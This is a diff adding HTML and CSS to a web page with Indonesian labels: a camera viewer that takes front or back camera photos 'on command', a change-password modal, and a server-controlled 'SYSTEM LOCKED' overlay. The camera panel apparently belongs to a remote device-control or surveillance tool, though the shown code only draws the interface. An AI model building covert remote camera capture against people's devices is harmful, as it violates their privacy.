+                            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z">
+                            </path>
+                            <circle cx="12" cy="13" r="4"></circle>
+                        </svg>
+                    </div>
+                    <p>MENUNGGU PERINTAH...</p>
+                </div>
+
+                <!-- Result Image -->
+                <img id="cam-result-img" src="index.html" class="hidden">
+
+                <!-- Loading Overlay -->
+                <div id="cam-spinner" class="fs-cam-loading hidden">
+                    <div class="fs-loader"></div>
+                    <div class="fs-loading-text">MENGAMBIL GAMBAR...</div>
+                    <button onclick="cancelPhoto()" class="fs-btn-cancel-action">BATAL</button>
+                </div>
+            </div>
+
+            <!-- Controls -->
+            <div class="fs-cam-controls">
+                <div class="fs-control-row">
+                    <button onclick="snapPhoto('front')" class="fs-btn">KAMERA DEPAN</button>
+                    <button onclick="snapPhoto('back')" class="fs-btn">KAMERA BELAKANG</button>
+                </div>
+                <button onclick="closeCamViewer()" class="fs-btn-close">TUTUP AKSES</button>
+            </div>
+        </div>
+    </div>
+
+    <style>
+        /* Full Screen Camera Styles */
+        #cam-viewer-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .fs-cam-container {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .fs-cam-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 0 10px;
+        }
+
+        .fs-cam-title {
+            font-family: 'Courier New', monospace;
+            color: #FF3B30;
+            font-weight: bold;
+            letter-spacing: 2px;
+            font-size: 1.2rem;
+            text-shadow: 0 0 10px rgba(255, 59, 48, 0.5);
+        }
+
+        .fs-live-badge {
+            background: #FF0000;
+            color: #FFF;
+            padding: 2px 8px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            border-radius: 4px;
+            animation: pulseRec 1s infinite;
+        }
+
+        .fs-cam-viewport {
+            flex: 1;
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-image: linear-gradient(rgba(255, 59, 48, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 59, 48, 0.05) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        .fs-cam-viewport::before {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            bottom: 10px;
+            border: 1px dashed rgba(255, 59, 48, 0.3);
+            pointer-events: none;
+        }
+
+        #cam-result-img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: #000;
+            z-index: 5;
+        }
+
+        .fs-cam-placeholder {
+            text-align: center;
+            color: #444;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .fs-cam-icon-large {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        /* Loading State */
+        .fs-cam-loading {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+            z-index: 20;
+        }
+
+        .fs-loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 59, 48, 0.3);
+            border-top: 3px solid #FF3B30;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        .fs-loading-text {
+            color: #FF3B30;
+            font-family: monospace;
+            letter-spacing: 2px;
+            font-size: 0.9rem;
+            margin-bottom: 30px;
+            animation: blink 1s infinite;
+        }
+
+        .fs-btn-cancel-action {
+            background: transparent;
+            border: 1px solid #FF3B30;
+            color: #FF3B30;
+            padding: 8px 20px;
+            font-family: monospace;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+
+        .fs-btn-cancel-action:hover {
+            background: #FF3B30;
+            color: white;
+        }
+
+        /* Controls */
+        .fs-cam-controls {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .fs-control-row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .fs-btn {
+            flex: 1;
+            background: rgba(255, 59, 48, 0.1);
+            border: 1px solid #FF3B30;
+            color: #FF3B30;
+            padding: 15px;
+            font-family: 'Outfit', sans-serif;
+            font-weight: bold;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-radius: 8px;
+        }
+
+        .fs-btn:hover {
+            background: #FF3B30;
+            color: #fff;
+            box-shadow: 0 0 15px rgba(255, 59, 48, 0.5);
+        }
+
+        .fs-btn:active {
+            transform: scale(0.98);
+        }
+
+        .fs-btn-close {
+            width: 100%;
+            background: #111;
+            border: 1px solid #333;
+            color: #666;
+            padding: 15px;
+            font-family: 'Outfit', sans-serif;
+            font-weight: bold;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            border-radius: 8px;
+        }
+
+        .fs-btn-close:hover {
+            border-color: #FF3B30;
+            color: #FF3B30;
+        }
+
+        @keyframes pulseRec {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes blink {
+            50% {
+                opacity: 0.5;
+            }
+        }
+    </style>
+</body>
+
+<!-- Change Password Modal (PREMIUM FLOATING DESIGN) -->
+<div id="change-pass-modal" class="modal-overlay hidden" style="
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.85);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 99999;
+    animation: fadeIn 0.3s ease;
+">
+    <div class="floating-pass-card" style="
+        background: linear-gradient(145deg, rgba(20, 20, 30, 0.95), rgba(10, 10, 20, 0.98));
+        border: 1px solid rgba(0, 255, 136, 0.2);
+        border-radius: 32px;
+        padding: 0;
+        max-width: 440px;
+        width: 90%;
+        box-shadow: 
+            0 30px 90px rgba(0, 255, 136, 0.15),
+            0 0 0 1px rgba(255, 255, 255, 0.05) inset,
+            0 10px 40px rgba(0, 0, 0, 0.6);
+        animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        overflow: hidden;
+    ">
+        <!-- Header with Avatar -->
+        <div style="
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1), rgba(0, 200, 255, 0.1));
+            padding: 30px 30px 25px;
+            text-align: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            position: relative;
+        ">
+            <div style="
+                width: 80px;
+                height: 80px;
+                margin: 0 auto 15px;
+                border-radius: 50%;
+                background: linear-gradient(135deg, #00FF88, #00C8FF);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3);
+                animation: pulse 2s ease-in-out infinite;
+            ">
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.5">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+            </div>
+            <h3 style="
+                margin: 0;
+                font-size: 1.5rem;
+                font-weight: 800;
+                color: #fff;
+                letter-spacing: 0.5px;
+            ">Ubah Password</h3>
+            <p style="
+                margin: 8px 0 0;
+                font-size: 0.85rem;
+                color: #888;
+            ">Perbarui keamanan akun Anda</p>
+
+            <button onclick="closeChangePasswordModal()" style="
+                position: absolute;
+                top: 20px;
+                right: 20px;
+                width: 36px;
+                height: 36px;
+                border-radius: 50%;
+                background: rgba(255, 255, 255, 0.05);
+                border: 1px solid rgba(255, 255, 255, 0.1);
+                color: #fff;
+                font-size: 24px;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                transition: all 0.3s ease;
+            " onmouseover="this.style.background='rgba(255, 59, 48, 0.2)'; this.style.borderColor='#FF3B30'; this.style.transform='rotate(90deg)'"
+                onmouseout="this.style.background='rgba(255, 255, 255, 0.05)'; this.style.borderColor='rgba(255, 255, 255, 0.1)'; this.style.transform='rotate(0deg)'">&times;</button>
+        </div>
+
+        <!-- Body -->
+        <form autocomplete="off" onsubmit="event.preventDefault(); submitChangePassword();">
+            <div style="padding: 30px;">
+                <!-- Email Display (Read-Only with Icon) -->
+                <div style="margin-bottom: 20px;">
+                    <label style="
+                    display: flex;
+                    align-items: center;
+                    gap: 8px;
+                    color: #00FF88;
+                    font-size: 0.75rem;
+                    font-weight: 700;
+                    text-transform: uppercase;
+                    letter-spacing: 1px;
+                    margin-bottom: 10px;
+                ">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z">
+                            </path>
+                            <polyline points="22,6 12,13 2,6"></polyline>
+                        </svg>
+                        Email Akun
+                    </label>
+                    <input type="text" id="cp-email-display" readonly autocomplete="off" style="
+                    width: 100%;
+                    padding: 16px 18px;
+                    background: rgba(0, 255, 136, 0.05);
+                    border: 1px solid rgba(0, 255, 136, 0.2);
+                    border-radius: 16px;
+                    color: #00FF88;
+                    font-family: 'Courier New', monospace;
+                    font-size: 0.95rem;
+                    font-weight: 600;
+                    cursor: not-allowed;
+                    box-shadow: 0 4px 15px rgba(0, 255, 136, 0.1) inset;
+                ">
+                </div>
+
+                <!-- New Password -->
+                <div style="margin-bottom: 20px; position: relative;">
+                    <label style="
+                    display: flex;
+                    align-items: center;
+                    gap: 8px;
+                    color: #00C8FF;
+                    font-size: 0.75rem;
+                    font-weight: 700;
+                    text-transform: uppercase;
+                    letter-spacing: 1px;
+                    margin-bottom: 10px;
+                ">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        </svg>
+                        Password Baru
+                    </label>
+                    <input type="password" id="cp-new-pass" placeholder="Minimal 6 karakter" autocomplete="new-password"
+                        style="
+                    width: 100%;
+                    padding: 16px 50px 16px 18px;
+                    background: rgba(255, 255, 255, 0.03);
+                    border: 1px solid rgba(255, 255, 255, 0.1);
+                    border-radius: 16px;
+                    color: #fff;
+                    font-size: 0.95rem;
+                    transition: all 0.3s ease;
+                " onfocus="this.style.borderColor='#00C8FF'; this.style.background='rgba(0, 200, 255, 0.05)'; this.style.boxShadow='0 0 0 3px rgba(0, 200, 255, 0.1)'"
+                        onblur="this.style.borderColor='rgba(255, 255, 255, 0.1)'; this.style.background='rgba(255, 255, 255, 0.03)'; this.style.boxShadow='none'">
+                    <button onclick="togglePassVisibility('cp-new-pass', this)" style="
+                    position: absolute;
+                    right: 12px;
+                    top: 46px;
+                    width: 36px;
+                    height: 36px;
+                    background: none;
+                    border: none;
+                    color: #666;
+                    cursor: pointer;
+                    border-radius: 8px;
+                    transition: all 0.2s ease;
+                " onmouseover="this.style.background='rgba(255, 255, 255, 0.05)'; this.style.color='#00FF88'"
+                        onmouseout="this.style.background='none'; this.style.color='#666'">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Confirm Password -->
+                <div style="margin-bottom: 30px; position: relative;">
+                    <label style="
+                    display: flex;
+                    align-items: center;
+                    gap: 8px;
+                    color: #FF9500;
+                    font-size: 0.75rem;
+                    font-weight: 700;
+                    text-transform: uppercase;
+                    letter-spacing: 1px;
+                    margin-bottom: 10px;
+                ">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="20 6 9 17 4 12"></polyline>
+                        </svg>
+                        Konfirmasi Password
+                    </label>
+                    <input type="password" id="cp-confirm-pass" placeholder="Ulangi password baru"
+                        autocomplete="new-password" style="
+                    width: 100%;
+                    padding: 16px 50px 16px 18px;
+                    background: rgba(255, 255, 255, 0.03);
+                    border: 1px solid rgba(255, 255, 255, 0.1);
+                    border-radius: 16px;
+                    color: #fff;
+                    font-size: 0.95rem;
+                    transition: all 0.3s ease;
+                " onfocus="this.style.borderColor='#FF9500'; this.style.background='rgba(255, 149, 0, 0.05)'; this.style.boxShadow='0 0 0 3px rgba(255, 149, 0, 0.1)'"
+                        onblur="this.style.borderColor='rgba(255, 255, 255, 0.1)'; this.style.background='rgba(255, 255, 255, 0.03)'; this.style.boxShadow='none'">
+                    <button onclick="togglePassVisibility('cp-confirm-pass', this)" style="
+                    position: absolute;
+                    right: 12px;
+                    top: 46px;
+                    width: 36px;
+                    height: 36px;
+                    background: none;
+                    border: none;
+                    color: #666;
+                    cursor: pointer;
+                    border-radius: 8px;
+                    transition: all 0.2s ease;
+                " onmouseover="this.style.background='rgba(255, 255, 255, 0.05)'; this.style.color='#00FF88'"
+                        onmouseout="this.style.background='none'; this.style.color='#666'">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Action Buttons -->
+                <div style="display: flex; gap: 12px;">
+                    <button onclick="closeChangePasswordModal()" style="
+                    flex: 1;
+                    padding: 16px;
+                    background: rgba(255, 255, 255, 0.05);
+                    border: 1px solid rgba(255, 255, 255, 0.1);
+                    border-radius: 16px;
+                    color: #fff;
+                    font-weight: 700;
+                    font-size: 0.95rem;
+                    cursor: pointer;
+                    transition: all 0.3s ease;
+                    letter-spacing: 0.5px;
+                " onmouseover="this.style.background='rgba(255, 255, 255, 0.08)'; this.style.transform='translateY(-2px)'; this.style.boxShadow='0 8px 20px rgba(0, 0, 0, 0.3)'"
+                        onmouseout="this.style.background='rgba(255, 255, 255, 0.05)'; this.style.transform='translateY(0)'; this.style.boxShadow='none'">BATAL</button>
+
+                    <button id="btn-save-password" onclick="submitChangePassword()" style="
+                    flex: 1;
+                    padding: 16px;
+                    background: linear-gradient(135deg, #00FF88, #00C8FF);
+                    border: none;
+                    border-radius: 16px;
+                    color: #000;
+                    font-weight: 800;
+                    font-size: 0.95rem;
+                    cursor: pointer;
+                    transition: all 0.3s ease;
+                    letter-spacing: 0.5px;
+                    box-shadow: 0 8px 25px rgba(0, 255, 136, 0.3);
+                " onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 12px 35px rgba(0, 255, 136, 0.4)'"
+                        onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 8px 25px rgba(0, 255, 136, 0.3)'">SIMPAN</button>
+                </div>
+            </div>
+        </form>
+    </div>
+</div>
+
+<style>
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+        }
+
+        to {
+            opacity: 1;
+        }
+    }
+
+    @keyframes slideUp {
+        from {
+            opacity: 0;
+            transform: translateY(30px) scale(0.95);
+        }
+
+        to {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+        }
+    }
+
+    @keyframes pulse {
+
+        0%,
+        100% {
+            transform: scale(1);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3);
+        }
+
+        50% {
+            transform: scale(1.05);
+            box-shadow: 0 15px 40px rgba(0, 255, 136, 0.5);
+        }
+    }
+</style>
+
+
+<!-- Success Toast (Notification) -->
+<div id="toast-notification" class="hidden"
+    style="position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(0, 255, 136, 0.9); color: #000; padding: 16px 24px; border-radius: 50px; font-weight: bold; z-index: 10000; box-shadow: 0 10px 30px rgba(0,255,136,0.3); display: flex; align-items: center; gap: 10px; backdrop-filter: blur(10px);">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+        <polyline points="20 6 9 17 4 12"></polyline>
+    </svg>
+    <span id="toast-message">Password Berhasil Diubah!</span>
+</div>
+
+<!-- MAINTENANCE OVERLAY (Server Control) -->
+<div id="maintenance-overlay"
+    style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:999999; flex-direction:column; align-items:center; justify-content:center; text-align:center; font-family:'Courier New', monospace;">
+    <div style="color:#ff3b30; text-shadow:0 0 20px rgba(255, 59, 48, 0.5); animation: pulse-overlay 2s infinite;">
+        <!-- Simple SVG Warning Icon -->
+        <svg style="margin:0 auto 20px; width:64px; height:64px; display:block;" fill="none" stroke="currentColor"
+            stroke-width="2" viewBox="0 0 24 24">
+            <path
+                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z">
+            </path>
+        </svg>
+        <h1 style="font-size:2rem; margin:0; font-weight:900; letter-spacing:4px;">SYSTEM LOCKED</h1>
+    </div>
+    <div style="width:80%; max-width:400px; height:2px; background:#333; margin:20px 0;"></div>
+    <p style="color:#fff; font-size:1rem; letter-spacing:1px; margin-bottom:10px;">SERVER UNDER MAINTENANCE</p>
+    <p style="color:#666; font-size:0.8rem;">Access is restricted by Administrator.</p>
+</div>
+<style>
+    @keyframes pulse-overlay {
+
+        0%,
+        100% {
+            transform: scale(1);
+            opacity: 1;
+        }
+
+        50% {
+            transform: scale(1.05);
+            opacity: 0.8;
+        }
+    }
+</style>
+</body>
+
+</html>
